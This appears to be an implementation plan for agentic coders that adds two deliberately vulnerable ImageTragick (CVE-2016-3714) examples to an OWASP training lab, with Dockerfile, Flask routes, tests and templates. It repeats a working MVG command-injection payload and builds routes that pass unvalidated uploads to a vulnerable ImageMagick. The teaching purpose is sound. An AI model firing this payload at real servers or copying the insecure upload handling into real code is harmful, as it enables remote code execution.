# A06 ImageMagick ImageTragick RCE Addition Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add 2 new intentionally-vulnerable examples to A06 (Vulnerable and Outdated Components) — a genuine remote-code-execution vulnerability via a real, unpatched ImageMagick build (CVE-2016-3714 "ImageTragick"), plus a Hard variant showing a naive extension-allowlist "fix" that doesn't help — bringing the app from 103 to 105 examples and max score from 2220 to 2270.

**Architecture:** A single-stage Dockerfile addition compiles a genuinely vulnerable ImageMagick 6.9.2-10 from a vendored source tarball (`vendor/ImageMagick-6.9.2-10.tar.xz`, already committed) into `/usr/local/bin/convert` — the only ImageMagick on the image. Two new Flask routes in A06 shell out to it via `subprocess.run()`, following this app's established convention (matching A03's `host_lookup`/`export_archive`). No new SQLAlchemy models — filesystem-only, matching A01/A03's existing upload-directory precedent.

**Tech Stack:** Flask, Werkzeug's `FileStorage`, Python's `subprocess`, the vendored ImageMagick 6.9.2-10 C binary, pytest with Flask's test client.

**Spec:** `docs/superpowers/specs/2026-09-28-owasp-lab-a06-imagetragick-design.md`

## Global Constraints

- No new SQLAlchemy models — both examples are filesystem-only (`instance/a06_thumbnails/`).
- Every `ExampleNav.hints` list has 3-5 entries, each non-empty, no duplicates within the list.
- Within each category's `grouped_examples()` output, every group's examples must be sorted Easy → Medium → Hard. The new group has exactly 2 members (Medium, Hard) — already in order.
- Hints render through Jinja's autoescaped `{{ hint }}` — raw unescaped `<`/`>`/`&` is correct there. The six static template blocks (explanation/detect/exploitation/tasks/vulnerable_code/secure_code/live_example) are NOT autoescaped — any literal `<`/`>`/`&` meant as visible text must be manually entity-encoded.
- **The vulnerabilities ARE the deliverable.** Both routes must call the real vendored `convert` binary with zero content validation on the uploaded file. The filtered route's extension check must remain EXACTLY the narrow suffix test specified below — never upgraded to real content-type sniffing (that upgrade belongs only in the `secure_code` documentation block).
- **`curl` must be present in the final Docker image at runtime** — it is the actual delegate binary the vulnerable HTTPS coder shells out to, not a build-only dependency. Never remove it after the build step.
- **The Docker build must use the vendored tarball at `vendor/ImageMagick-6.9.2-10.tar.xz`** (already committed, sha256 `da2f6fba43d69f20ddb11783f13f77782b0b57783dde9cda39c9e5e733c2013c`) — never fetch it from a network mirror at build time.
- New routes follow this category's existing plain `render_template()` convention.
- Every `ExampleNav.endpoint` must point at a route that renders an HTML explanation page on every code path (both GET and after every POST) — a prior round's plan shipped 2 routes that sometimes skipped `render_template()` entirely, a real defect caught in review. Both new routes below already fall through to a single terminal `render_template()` call unconditionally; preserve that shape exactly.
- Test files that depend on the real vulnerable `convert` binary must gate the specific RCE-proof test behind a `pytest.mark.skipif`, exactly matching the established precedent in `tests/test_a03_argument_injection.py`'s `requires_gnu_tar` — this repo's own tests run against an in-memory SQLite database and are documented as not requiring Docker, so a bare `pytest` run on a contributor's machine will not have this specific compiled binary on `PATH`.

---

### Task 1: Dockerfile — compile the vendored vulnerable ImageMagick

**Files:**
- Modify: `Dockerfile`

**Interfaces:**
- Consumes: `vendor/ImageMagick-6.9.2-10.tar.xz` (already committed at repo tip).
- Produces: `/usr/local/bin/convert` and `/usr/local/bin/identify` inside the built image — a genuinely vulnerable ImageMagick 6.9.2-10 build, the only ImageMagick present. Task 2's Flask routes depend on this binary being on `PATH` inside the container.

This task is infrastructure-only — no Flask/Python application code changes. It was fully verified end-to-end before this plan was written: the exact Dockerfile change below was built as a standalone test image (matching `python:3.12-slim`), and the classic ImageTragick payload was confirmed to genuinely execute an injected command inside the resulting container (a proof file was created on disk).

- [ ] **Step 1: Read the current Dockerfile fresh**

Read `Dockerfile` in full. If anything has changed from what's shown below, adapt accordingly — this plan is accurate as of repo tip `4cf143c`.

- [ ] **Step 2: Add the ImageMagick compile step**

In `Dockerfile`, insert this block immediately after the existing `groupadd`/`useradd` block and before `WORKDIR /app`:

```dockerfile
# ImageMagick 6.9.2-10 -- the last release before CVE-2016-3714
# ("ImageTragick") was fixed in 6.9.3-10. Compiled from a vendored source
# tarball (not fetched at build time -- ImageMagick's own release archive
# no longer resolves, and no single external mirror is guaranteed to stay
# up long-term) since Debian's packaged `imagemagick` is a modern, patched
# build. This is the ONLY ImageMagick on this image -- the Debian package
# is never installed, so `convert` on PATH always resolves to this exact
# vulnerable build. `curl` is required at RUNTIME, not just build time: it
# is the actual delegate binary ImageMagick's vulnerable HTTPS coder shells
# out to -- see app/categories/a06_vulnerable_components/routes.py.
COPY vendor/ImageMagick-6.9.2-10.tar.xz /tmp/imagemagick.tar.xz
RUN echo "da2f6fba43d69f20ddb11783f13f77782b0b57783dde9cda39c9e5e733c2013c  /tmp/imagemagick.tar.xz" | sha256sum -c - \
    && apt-get update \
    && apt-get install -y --no-install-recommends \
        build-essential curl xz-utils \
        libjpeg-dev libpng-dev libtiff-dev zlib1g-dev pkg-config \
    && cd /tmp && tar xJf imagemagick.tar.xz \
    && cd ImageMagick-6.9.2-10 \
    && ./configure --without-x --disable-openmp --without-perl \
    && make -j"$(nproc)" \
    && make install \
    && ldconfig \
    && cd / && rm -rf /tmp/imagemagick.tar.xz /tmp/ImageMagick-6.9.2-10 \
    && rm -rf /var/lib/apt/lists/*
```

The resulting `Dockerfile` should read, in full:

```dockerfile
FROM python:3.12-slim

RUN groupadd --gid 1000 appuser \
    && useradd --uid 1000 --gid appuser --create-home appuser

# ImageMagick 6.9.2-10 -- the last release before CVE-2016-3714
# ("ImageTragick") was fixed in 6.9.3-10. Compiled from a vendored source
# tarball (not fetched at build time -- ImageMagick's own release archive
# no longer resolves, and no single external mirror is guaranteed to stay
# up long-term) since Debian's packaged `imagemagick` is a modern, patched
# build. This is the ONLY ImageMagick on this image -- the Debian package
# is never installed, so `convert` on PATH always resolves to this exact
# vulnerable build. `curl` is required at RUNTIME, not just build time: it
# is the actual delegate binary ImageMagick's vulnerable HTTPS coder shells
# out to -- see app/categories/a06_vulnerable_components/routes.py.
COPY vendor/ImageMagick-6.9.2-10.tar.xz /tmp/imagemagick.tar.xz
RUN echo "da2f6fba43d69f20ddb11783f13f77782b0b57783dde9cda39c9e5e733c2013c  /tmp/imagemagick.tar.xz" | sha256sum -c - \
    && apt-get update \
    && apt-get install -y --no-install-recommends \
        build-essential curl xz-utils \
        libjpeg-dev libpng-dev libtiff-dev zlib1g-dev pkg-config \
    && cd /tmp && tar xJf imagemagick.tar.xz \
    && cd ImageMagick-6.9.2-10 \
    && ./configure --without-x --disable-openmp --without-perl \
    && make -j"$(nproc)" \
    && make install \
    && ldconfig \
    && cd / && rm -rf /tmp/imagemagick.tar.xz /tmp/ImageMagick-6.9.2-10 \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

RUN chown -R appuser:appuser /app
USER appuser

EXPOSE 5000

# 4 workers, not 2: /a03/xxe-ssrf, and A10's webhook-tester, port-scan-demo,
# pdf-generator, import-avatar, and mirror-fetcher routes all make
# self-referential/outbound HTTP requests and need a free worker while their
# own is blocked handling the request.
CMD ["gunicorn", "--bind", "0.0.0.0:5000", "--workers", "4", "--preload", "--config", "gunicorn.conf.py", "wsgi:application"]
```

- [ ] **Step 3: Build the image and verify the vendored tarball's integrity check passes**

Run: `docker build -t owasp-lab-imagetragick-test .`
Expected: build succeeds; the `sha256sum -c -` line does not report `FAILED`; the ImageMagick `./configure`/`make`/`make install` steps complete with exit 0.

- [ ] **Step 4: Verify the resulting binary is genuinely the vulnerable version**

Run: `docker run --rm owasp-lab-imagetragick-test convert -version`
Expected: output contains `ImageMagick 6.9.2-10`.

- [ ] **Step 5: Verify the exploit genuinely fires inside the built image**

Create a local scratch file (outside the repo, e.g. `/tmp/im-verify/poc.jpg`) containing:
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|touch /tmp/imagetragick_verify_proof;false")'
pop graphic-context
```
Run: `docker run --rm -v /tmp/im-verify:/work owasp-lab-imagetragick-test bash -c "convert /work/poc.jpg /tmp/out.png; ls -la /tmp/imagetragick_verify_proof"`
Expected: the `ls` output shows the proof file exists (created by the injected `touch` command that fired via ImageMagick's HTTPS delegate) — this is the exact mechanism Task 2's routes will trigger over HTTP.

- [ ] **Step 6: Clean up the test image**

Run: `docker rmi owasp-lab-imagetragick-test`

- [ ] **Step 7: Commit**

```bash
git add Dockerfile
git commit -m "build(a06): compile vendored ImageMagick 6.9.2-10 for the ImageTragick RCE example"
```

---

### Task 2: A06 ImageTragick RCE examples (base + extension-allowlist bypass)

**Files:**
- Modify: `app/categories/a06_vulnerable_components/routes.py` (append two new routes at the end of the file)
- Modify: `app/categories/a06_vulnerable_components/__init__.py` (append two new `ExampleNav` entries at the very end of the examples list, forming a brand-new group)
- Create: `app/categories/a06_vulnerable_components/templates/a06_vulnerable_components/thumbnail_generator.html`
- Create: `app/categories/a06_vulnerable_components/templates/a06_vulnerable_components/thumbnail_generator_filtered.html`
- Create: `tests/test_a06_imagetragick.py`
- Modify: `tests/test_a06_hints.py`
- Modify: `tests/test_a06_overview.py`

**Interfaces:**
- Consumes: the `convert` binary Task 1 compiled onto `PATH` (already landed on this branch).
- Produces: routes `a06_vulnerable_components.thumbnail_generator` (GET/POST) and `a06_vulnerable_components.thumbnail_generator_filtered` (GET/POST). `ExampleNav` ids `imagetragick-rce` and `imagetragick-extension-bypass`, forming a brand-new `"Vulnerable Library: ImageMagick ImageTragick RCE"` group, appended at the very end of A06's examples list (after the existing `prototype-pollution-bypass` entry).

**Test-design note (read before Step 2):** this repo's test suite runs against an in-memory SQLite database and is documented as not requiring Docker (`README.md`'s Development section) — meaning a bare `pytest` run on a contributor's machine will almost never have Task 1's specific compiled `convert` binary on `PATH`. Following the exact established precedent in `tests/test_a03_argument_injection.py` (`requires_gnu_tar`), the tests that need the real exploit to fire are gated behind a `pytest.mark.skipif` that checks for the exact vulnerable version string. These tests WILL run and genuinely prove RCE inside the project's real Docker image (or in any local environment where a contributor has manually built this exact ImageMagick version) — they will show as skipped when run via a bare local `pytest`, exactly like the existing GNU-tar-gated test.

- [ ] **Step 1: Read A06's current routes.py and __init__.py fresh**

Read `app/categories/a06_vulnerable_components/routes.py` in full and `app/categories/a06_vulnerable_components/__init__.py` in full. If anything has changed from what's shown below, adapt accordingly — this plan is accurate as of repo tip `4cf143c` (plus Task 1's Dockerfile commit).

- [ ] **Step 2: Write the failing tests**

Create `tests/test_a06_imagetragick.py`:

```python
import io
import os
import shutil
import subprocess

import pytest

from app.categories.a06_vulnerable_components.routes import IMAGETRAGICK_PROOF_PATH

IMAGETRAGICK_PAYLOAD = (
    b"push graphic-context\n"
    b"viewbox 0 0 640 480\n"
    b"fill 'url(https://example.com/image.jpg\"|id > "
    b"/tmp/a06_imagetragick_proof.txt;false\")'\n"
    b"pop graphic-context\n"
)


def _convert_version_string():
    convert_path = shutil.which("convert")
    if not convert_path:
        return None
    result = subprocess.run([convert_path, "-version"], capture_output=True, text=True)
    return result.stdout


requires_vulnerable_imagemagick = pytest.mark.skipif(
    "ImageMagick 6.9.2-10" not in (_convert_version_string() or ""),
    reason="requires the exact pre-CVE-2016-3714-fix ImageMagick 6.9.2-10 this "
    "app's real Docker image compiles from vendor/ImageMagick-6.9.2-10.tar.xz; "
    "a local test environment's ImageMagick (if any) is a different, patched version",
)


@pytest.fixture(autouse=True)
def _clean_proof_file():
    if os.path.exists(IMAGETRAGICK_PROOF_PATH):
        os.remove(IMAGETRAGICK_PROOF_PATH)
    yield
    if os.path.exists(IMAGETRAGICK_PROOF_PATH):
        os.remove(IMAGETRAGICK_PROOF_PATH)


def test_thumbnail_generator_page_renders(client):
    response = client.get("/a06/thumbnail-generator")
    assert response.status_code == 200
    assert b"ImageTragick" in response.data


def test_thumbnail_generator_filtered_page_renders(client):
    response = client.get("/a06/thumbnail-generator-filtered")
    assert response.status_code == 200


def test_filtered_route_blocks_a_non_image_extension(client):
    data = {"image": (io.BytesIO(b"not an image at all"), "payload.mvg")}
    response = client.post(
        "/a06/thumbnail-generator-filtered", data=data, content_type="multipart/form-data"
    )
    assert response.status_code == 200
    assert not os.path.exists(IMAGETRAGICK_PROOF_PATH)


@requires_vulnerable_imagemagick
def test_imagetragick_payload_achieves_rce_via_thumbnail_generator(client):
    data = {"image": (io.BytesIO(IMAGETRAGICK_PAYLOAD), "poc.jpg")}
    response = client.post(
        "/a06/thumbnail-generator", data=data, content_type="multipart/form-data"
    )
    assert response.status_code == 200

    # the injected command genuinely executed on the real filesystem -- not
    # merely that the route accepted the input without erroring
    assert os.path.exists(IMAGETRAGICK_PROOF_PATH)
    with open(IMAGETRAGICK_PROOF_PATH) as f:
        proof_content = f.read()
    assert "uid=" in proof_content

    body = response.data.decode()
    assert "uid=" in body


@requires_vulnerable_imagemagick
def test_imagetragick_payload_bypasses_extension_allowlist(client):
    # The exact same payload as the base example, merely named "poc.jpg" --
    # already satisfies the filtered route's ".jpg/.jpeg/.png/.gif" check.
    data = {"image": (io.BytesIO(IMAGETRAGICK_PAYLOAD), "poc.jpg")}
    response = client.post(
        "/a06/thumbnail-generator-filtered", data=data, content_type="multipart/form-data"
    )
    assert response.status_code == 200

    assert os.path.exists(IMAGETRAGICK_PROOF_PATH)
    with open(IMAGETRAGICK_PROOF_PATH) as f:
        proof_content = f.read()
    assert "uid=" in proof_content
```

- [ ] **Step 3: Run tests to verify they fail**

Run: `pytest tests/test_a06_imagetragick.py -v`
Expected: the 3 ungated tests FAIL with `404 NOT FOUND` (neither route exists yet); the 2 `@requires_vulnerable_imagemagick`-gated tests SKIP (this local environment does not have the vulnerable `convert` build on `PATH`) unless you are running inside the project's actual Docker image or have manually built Task 1's exact ImageMagick version locally.

- [ ] **Step 4: Add the two vulnerable routes**

At the top of `app/categories/a06_vulnerable_components/routes.py`, change:

```python
from importlib.metadata import version
import platform

from flask import render_template

from app.categories.a06_vulnerable_components import a06_bp
```

to:

```python
from importlib.metadata import version
import os
import platform
import subprocess

from flask import render_template, request

from app import BASE_DIR
from app.categories.a06_vulnerable_components import a06_bp

THUMBNAILS_DIR = os.path.join(BASE_DIR, "instance", "a06_thumbnails")
IMAGETRAGICK_PROOF_PATH = "/tmp/a06_imagetragick_proof.txt"
ALLOWED_THUMBNAIL_EXTENSIONS = (".jpg", ".jpeg", ".png", ".gif")
```

Append these two routes to the end of the file (after the current last function, `admin_tools_panel()`):

```python
@a06_bp.route("/thumbnail-generator", methods=["GET", "POST"])
def thumbnail_generator():
    output = None
    if request.method == "POST":
        os.makedirs(THUMBNAILS_DIR, exist_ok=True)
        image = request.files.get("image")
        if image and image.filename:
            input_path = os.path.join(THUMBNAILS_DIR, image.filename)
            image.save(input_path)
            output_path = os.path.join(THUMBNAILS_DIR, "thumbnail.png")
            # VULNERABLE: shells out to a genuinely vulnerable ImageMagick
            # build (CVE-2016-3714 "ImageTragick") with zero validation of
            # the uploaded file's actual content -- ImageMagick detects the
            # real image format from the file's CONTENT, not its extension,
            # so a file merely NAMED "photo.jpg" can still be parsed as an
            # MVG vector-graphics script if that's what it actually contains.
            result = subprocess.run(
                ["convert", input_path, "-resize", "200x200", output_path],
                capture_output=True,
                text=True,
                timeout=10,
            )
            output = result.stdout or result.stderr or "(no output)"
    proof = None
    if os.path.exists(IMAGETRAGICK_PROOF_PATH):
        with open(IMAGETRAGICK_PROOF_PATH) as f:
            proof = f.read()
    return render_template(
        "a06_vulnerable_components/thumbnail_generator.html", output=output, proof=proof
    )


@a06_bp.route("/thumbnail-generator-filtered", methods=["GET", "POST"])
def thumbnail_generator_filtered():
    output = None
    blocked = False
    if request.method == "POST":
        os.makedirs(THUMBNAILS_DIR, exist_ok=True)
        image = request.files.get("image")
        if image and image.filename:
            if not image.filename.lower().endswith(ALLOWED_THUMBNAIL_EXTENSIONS):
                blocked = True
            else:
                input_path = os.path.join(THUMBNAILS_DIR, image.filename)
                image.save(input_path)
                output_path = os.path.join(THUMBNAILS_DIR, "thumbnail_filtered.png")
                # VULNERABLE: the extension check above only confirms the
                # FILENAME looks like an image -- ImageMagick still detects
                # the real file format from its CONTENT, so the identical
                # MVG payload, merely named "poc.jpg", sails through this
                # check completely unchanged.
                result = subprocess.run(
                    ["convert", input_path, "-resize", "200x200", output_path],
                    capture_output=True,
                    text=True,
                    timeout=10,
                )
                output = result.stdout or result.stderr or "(no output)"
    proof = None
    if os.path.exists(IMAGETRAGICK_PROOF_PATH):
        with open(IMAGETRAGICK_PROOF_PATH) as f:
            proof = f.read()
    return render_template(
        "a06_vulnerable_components/thumbnail_generator_filtered.html",
        output=output,
        blocked=blocked,
        proof=proof,
    )
```

- [ ] **Step 5: Create the two templates**

Create `app/categories/a06_vulnerable_components/templates/a06_vulnerable_components/thumbnail_generator.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "ImageTragick RCE via Image Upload" %}
{% set example_difficulty = "Medium" %}
{% block title %}{{ example_title }} — A06{% endblock %}

{% block explanation %}
<p>
  This "generate a thumbnail" feature accepts an uploaded image and shells
  out to a real, vendored ImageMagick build to resize it. That build is
  ImageMagick 6.9.2-10 -- the last release before
  <strong>CVE-2016-3714</strong> ("ImageTragick") was fixed in 6.9.3-10.
  ImageMagick's own delegate mechanism can be tricked into shelling out to
  an external command when it processes a crafted file, and this feature
  performs zero validation of the uploaded file's actual content before
  handing it to that real, unpatched binary.
</p>
{% endblock %}

{% block detect %}
<p>
  Upload an ordinary photo first and confirm a thumbnail is generated
  normally. Then think about what ImageMagick actually does when it reads
  a file: does it trust the filename's extension, or does it look at the
  file's real content to decide how to parse it?
</p>
{% endblock %}

{% block exploitation %}
<p>
  Upload a file named <code>poc.jpg</code> containing the following (this
  is <strong>Magick Vector Graphics</strong> script, not a real photo):
</p>
<pre>push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id &gt; /tmp/a06_imagetragick_proof.txt;false")'
pop graphic-context</pre>
<p>
  ImageMagick detects the real MVG content regardless of the misleading
  <code>.jpg</code> extension. Processing this "image" makes ImageMagick's
  HTTPS delegate shell out to <code>curl</code> with the crafted string
  embedded in its command line -- the injected
  <code>id &gt; /tmp/a06_imagetragick_proof.txt</code> genuinely executes on
  the server, and the proof file's real content (this server's actual
  <code>id</code> output) is shown below after you upload the payload.
</p>
<p>
  This is a real, historical, extremely famous CVE (assigned a name,
  ImageTragick, and its own dedicated advisory site) — not a contrived
  training-only bug. The same delegate mechanism has other variants
  (different coders, different shell metacharacter tricks); this is the
  original 2016 proof-of-concept.
</p>
{% endblock %}

{% block vulnerable_code %}image.save(input_path)
result = subprocess.run(
    ["convert", input_path, "-resize", "200x200", output_path],
    capture_output=True, text=True, timeout=10,
)
{% endblock %}

{% block secure_code %}# Upgrade past ImageMagick 6.9.3-10 (the actual fix), AND
# independently restrict policy.xml to the small set of coders this
# feature genuinely needs (defense in depth, since delegate-based bugs
# in this family have recurred more than once):
#   <policy domain="coder" rights="none" pattern="{MVG,MSL,EPHEMERAL,URL,HTTPS,HTTP}" />
image.save(input_path)
result = subprocess.run(
    ["convert", input_path, "-resize", "200x200", output_path],
    capture_output=True, text=True, timeout=10,
)
{% endblock %}

{% block live_example %}
<form method="post" enctype="multipart/form-data">
  <div class="mb-2">
    <label class="form-label">Image file</label>
    <input type="file" class="form-control" name="image" required>
  </div>
  <button type="submit" class="btn btn-primary">Generate thumbnail</button>
</form>
{% if output %}
<pre class="mt-3">{{ output }}</pre>
{% endif %}
{% if proof %}
<div class="alert alert-danger mt-3">
  <strong>Proof of code execution</strong> (contents of
  <code>/tmp/a06_imagetragick_proof.txt</code>, written by the server's own
  <code>id</code> command):
  <pre class="mb-0">{{ proof }}</pre>
</div>
{% endif %}
{% endblock %}
```

Create `app/categories/a06_vulnerable_components/templates/a06_vulnerable_components/thumbnail_generator_filtered.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "ImageTragick Bypasses an Image-Extension Allowlist" %}
{% set example_difficulty = "Hard" %}
{% block title %}{{ example_title }} — A06{% endblock %}

{% block explanation %}
<p>
  This version of the thumbnail generator adds a check: the uploaded
  file's name must end in <code>.jpg</code>, <code>.jpeg</code>,
  <code>.png</code>, or <code>.gif</code> before it's handed to
  ImageMagick at all. This genuinely blocks a file named, say,
  <code>poc.mvg</code>.
</p>
{% endblock %}

{% block detect %}
<p>
  Confirm the filter works: try uploading a file named <code>poc.mvg</code>
  -- rejected. Now think about what the filter actually checks, versus
  what ImageMagick itself checks when it decides how to parse a file.
</p>
{% endblock %}

{% block exploitation %}
<p>
  The filter only looks at the FILENAME's extension. Upload the exact same
  MVG payload from the sibling "ImageTragick RCE via Image Upload"
  example in this group, but save it as <code>poc.jpg</code> instead of
  <code>poc.mvg</code>:
</p>
<pre>push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id &gt; /tmp/a06_imagetragick_proof.txt;false")'
pop graphic-context</pre>
<p>
  <code>poc.jpg</code> satisfies the extension check -- but ImageMagick
  still detects the file's real content as MVG script, exactly as before,
  and the identical command execution fires. The "fix" changed nothing
  about the actual vulnerability; it only added a check on a property
  (the filename) the underlying bug never looked at in the first place.
</p>
{% endblock %}

{% block vulnerable_code %}if not image.filename.lower().endswith((".jpg", ".jpeg", ".png", ".gif")):
    blocked = True
else:
    image.save(input_path)
    result = subprocess.run(
        ["convert", input_path, "-resize", "200x200", output_path],
        capture_output=True, text=True, timeout=10,
    )
{% endblock %}

{% block secure_code %}# An extension allowlist alone never validates file CONTENT.
# Verify the actual decoded format matches what was claimed, e.g. via
# `identify -format %m <path>` compared against the extension, AND apply
# the same policy.xml coder restriction as the sibling example:
if not image.filename.lower().endswith((".jpg", ".jpeg", ".png", ".gif")):
    blocked = True
else:
    image.save(input_path)
    detected_format = subprocess.run(
        ["identify", "-format", "%m", input_path], capture_output=True, text=True
    ).stdout.strip()
    if detected_format not in ("JPEG", "PNG", "GIF"):
        blocked = True
    else:
        result = subprocess.run(
            ["convert", input_path, "-resize", "200x200", output_path],
            capture_output=True, text=True, timeout=10,
        )
{% endblock %}

{% block live_example %}
<form method="post" enctype="multipart/form-data">
  <div class="mb-2">
    <label class="form-label">Image file</label>
    <input type="file" class="form-control" name="image" required>
  </div>
  <button type="submit" class="btn btn-primary">Generate thumbnail</button>
</form>
{% if blocked %}
<div class="alert alert-warning mt-3">Rejected: file extension is not an allowed image type.</div>
{% endif %}
{% if output %}
<pre class="mt-3">{{ output }}</pre>
{% endif %}
{% if proof %}
<div class="alert alert-danger mt-3">
  <strong>Proof of code execution</strong> (contents of
  <code>/tmp/a06_imagetragick_proof.txt</code>, written by the server's own
  <code>id</code> command):
  <pre class="mb-0">{{ proof }}</pre>
</div>
{% endif %}
{% endblock %}
```

- [ ] **Step 6: Register both ExampleNav entries**

In `app/categories/a06_vulnerable_components/__init__.py`, append these two new `ExampleNav` entries at the very end of the examples list (after the `prototype-pollution-bypass` entry, before the list's closing `],`):

```python
            ExampleNav(
                id="imagetragick-rce",
                title="ImageTragick RCE via Image Upload",
                group="Vulnerable Library: ImageMagick ImageTragick RCE",
                difficulty="Medium",
                endpoint="a06_vulnerable_components.thumbnail_generator",
                hints=[
                    "This 'generate a thumbnail' feature shells out to a real ImageMagick binary to resize whatever you upload. Look up what version of ImageMagick this app vendors and check it against a public CVE database.",
                    "The vendored build is ImageMagick 6.9.2-10 -- the last release before CVE-2016-3714 ('ImageTragick') was fixed. ImageMagick detects a file's real format from its CONTENT, not its extension -- what happens if you upload a file that LOOKS like a .jpg but actually contains a different kind of script ImageMagick understands?",
                    "Upload a file named poc.jpg containing MVG (Magick Vector Graphics) script instead of real image data: push graphic-context / viewbox 0 0 640 480 / fill 'url(https://example.com/image.jpg\"|id > /tmp/a06_imagetragick_proof.txt;false\")' / pop graphic-context",
                    "ImageMagick's HTTPS delegate shells out to curl using your crafted string as part of its command line -- the injected id > /tmp/a06_imagetragick_proof.txt command genuinely executes on the server, and the page shows you the proof file's real content afterward.",
                ],
            ),
            ExampleNav(
                id="imagetragick-extension-bypass",
                title="ImageTragick Bypasses an Image-Extension Allowlist",
                group="Vulnerable Library: ImageMagick ImageTragick RCE",
                difficulty="Hard",
                endpoint="a06_vulnerable_components.thumbnail_generator_filtered",
                hints=[
                    "This version only accepts files whose name ends in .jpg, .jpeg, .png, or .gif before processing them. Confirm the filter genuinely blocks a file named poc.mvg first.",
                    "The check only ever looks at the FILENAME's extension -- it never inspects what the file actually contains. Does the sibling 'ImageTragick RCE via Image Upload' example's payload already have a filename that would pass this check?",
                    "Upload the exact same MVG payload from the sibling example, but save it as poc.jpg (it already is, in that example) -- the extension check passes, ImageMagick still detects the real content as MVG script regardless, and the identical command execution fires.",
                    "This is the same class of mistake as this lab's other filter-bypass examples: a check on one property of the input (here, the filename) provides zero protection against a bug that depends on a COMPLETELY DIFFERENT property (here, the actual file content) -- the 'fix' didn't touch the real vulnerability at all.",
                ],
            ),
```

- [ ] **Step 7: Run tests to verify they pass**

Run: `pytest tests/test_a06_imagetragick.py -v`
Expected: the 3 ungated tests PASS. The 2 `@requires_vulnerable_imagemagick`-gated tests SKIP locally (expected — this environment doesn't have Task 1's compiled binary), UNLESS you build and run this exact worktree inside the project's real Docker image (see Step 7b).

- [ ] **Step 7b: Manually verify genuine end-to-end RCE via the real Docker image**

This step is not automatable via `pytest` locally (per the Test-design note above) but must still be verified manually before this task is considered done, matching this project's standing practice of proving real exploitability, not just code review.

Run: `docker build -t owasp-lab-a06-verify .` (from the repo root, with Task 1's Dockerfile change and this task's route changes both present)
Then run the container and hit the real HTTP routes with the exact MVG payload from Step 2 (e.g. via `curl -F "image=@poc.jpg" http://127.0.0.1:<port>/a06/thumbnail-generator` against a running container, or via the app's own UI in a browser) and confirm the response shows real `id` command output.
Clean up: `docker rmi owasp-lab-a06-verify` when done.

- [ ] **Step 8: Update A06's cross-cutting test files**

In `tests/test_a06_hints.py`, change the example-count assertion from `6` to `8`.

In `tests/test_a06_overview.py`:

In `test_a06_registered_in_nav`, change:
```python
    assert [e.difficulty for e in a06.examples] == [
        "Easy",
        "Easy",
        "Medium",
        "Medium",
        "Hard",
        "Hard",
    ]
```
to:
```python
    assert [e.difficulty for e in a06.examples] == [
        "Easy",
        "Easy",
        "Medium",
        "Medium",
        "Hard",
        "Hard",
        "Medium",
        "Hard",
    ]
```

In `test_a06_examples_grouped_by_vulnerability_subtype`, change:
```python
    assert [name for name, _ in grouped] == [
        "Component Reconnaissance",
        "Vulnerable Library: jQuery HTML Sanitization Bypass",
        "Vulnerable Library: Lodash Prototype Pollution",
    ]
    assert [e.id for e in grouped[0][1]] == ["version-disclosure", "outdated-jquery-detection"]
    assert [e.id for e in grouped[1][1]] == ["jquery-dom-xss", "jquery-xss-session-theft"]
    assert [e.id for e in grouped[2][1]] == ["lodash-prototype-pollution", "prototype-pollution-bypass"]
```
to:
```python
    assert [name for name, _ in grouped] == [
        "Component Reconnaissance",
        "Vulnerable Library: jQuery HTML Sanitization Bypass",
        "Vulnerable Library: Lodash Prototype Pollution",
        "Vulnerable Library: ImageMagick ImageTragick RCE",
    ]
    assert [e.id for e in grouped[0][1]] == ["version-disclosure", "outdated-jquery-detection"]
    assert [e.id for e in grouped[1][1]] == ["jquery-dom-xss", "jquery-xss-session-theft"]
    assert [e.id for e in grouped[2][1]] == ["lodash-prototype-pollution", "prototype-pollution-bypass"]
    assert [e.id for e in grouped[3][1]] == ["imagetragick-rce", "imagetragick-extension-bypass"]
```

In `test_a06_overview_shows_vulnerability_subtype_group_headings`, add one more assertion:
```python
    assert "Vulnerable Library: ImageMagick ImageTragick RCE" in body
```

- [ ] **Step 9: Run the full A06 test surface**

Run: `pytest tests/test_a06_imagetragick.py tests/test_a06_hints.py tests/test_a06_overview.py tests/test_a06_component_inventory.py tests/test_a06_jquery_dom_xss.py tests/test_a06_jquery_session_theft.py tests/test_a06_legacy_widgets.py tests/test_a06_lodash_prototype_pollution.py tests/test_a06_prototype_pollution_bypass.py -v`
Expected: PASS (all tests, no regressions; the 2 RCE-proof tests skip locally as expected).

- [ ] **Step 10: Commit**

```bash
git add app/categories/a06_vulnerable_components/routes.py \
        app/categories/a06_vulnerable_components/__init__.py \
        app/categories/a06_vulnerable_components/templates/a06_vulnerable_components/thumbnail_generator.html \
        app/categories/a06_vulnerable_components/templates/a06_vulnerable_components/thumbnail_generator_filtered.html \
        tests/test_a06_imagetragick.py \
        tests/test_a06_hints.py \
        tests/test_a06_overview.py
git commit -m "feat(a06): add ImageMagick ImageTragick RCE examples (base + extension-allowlist bypass)"
```

---

### Task 3: Final Integration

**Files:**
- Modify: `tests/test_all_examples_have_hints.py`
- Modify: `tests/test_hints.py`
- Modify: `README.md`

**Interfaces:**
- Consumes: the final state of A06 after Tasks 1-2 — 105 total examples across all categories, max score 2270.
- Produces: nothing further downstream; this is the plan's last task.

- [ ] **Step 1: Confirm the actual current totals**

Before editing anything, run:

```bash
python3 -c "
from app import create_app
from app.core.nav import CATEGORIES
app = create_app()
with app.app_context():
    total = sum(len(c.examples) for c in CATEGORIES)
    print('total examples:', total)
"
```

Expected: `total examples: 105` (103 + Task 2's 2). If this doesn't read 105, stop and investigate before proceeding.

- [ ] **Step 2: Update the cross-cutting count assertion**

In `tests/test_all_examples_have_hints.py`, change `assert total == 103` to `assert total == 105`.

- [ ] **Step 3: Update the max-score assertions**

In `tests/test_hints.py`, change both `2220` occurrences to `2270`:

```python
    assert "Score: 10 / 2270 points" in body
```
and:
```python
    assert b"Score: 10 / 2270" in response.data
```

- [ ] **Step 4: Update README.md's intro paragraph**

Find the A06 clause in the intro paragraph, currently:
```
), **A06 Vulnerable
